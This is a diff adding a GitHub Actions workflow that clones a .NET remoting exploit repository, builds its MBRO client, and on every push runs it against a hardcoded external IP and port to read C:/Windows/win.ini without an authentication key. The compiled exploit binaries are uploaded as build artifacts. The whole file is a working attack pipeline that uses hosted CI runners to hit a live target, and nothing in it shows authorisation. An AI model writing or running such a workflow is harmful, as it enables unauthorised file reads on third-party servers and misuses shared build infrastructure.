@@ -1,0 +1,38 @@
+name: Build MBRO exploit v2
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Clone and build
+        run: |
+          git clone https://github.com/securifera/NewRemotingTricks C:\exploit
+          cd C:\exploit
+          
+          # List all projects
+          Get-ChildItem -Recurse -Filter "*.csproj" | Select FullName
+          
+          # Build with msbuild targeting net48
+          $proj = Get-ChildItem -Recurse -Filter "*.csproj" | Where-Object {$_.FullName -match "MBRO|RemotingClient"}
+          foreach ($p in $proj) {
+            Write-Host "=== Building $($p.Name) ==="
+            msbuild $p.FullName /p:Configuration=Release /p:TargetFramework=net48 /verbosity:minimal 2>&1 | Select-Object -Last 15
+          }
+          
+          # Find built exe
+          $exe = Get-ChildItem -Recurse -Filter "*.exe" | Where-Object {$_.FullName -match "Release" -and $_.Name -match "Client|MBRO"} | Select-Object -First 1
+          if ($exe) {
+            Write-Host "Built: $($exe.FullName)"
+            Write-Host "=== Running against target (no AuthKey) ==="
+            & $exe.FullName tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/win.ini" 2>&1
+          } else {
+            Write-Host "Build failed - no exe"
+            Get-ChildItem -Recurse -Filter "*.exe" | Select FullName
+          }
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mbro-v2
+          path: C:\exploit\**\Release\**
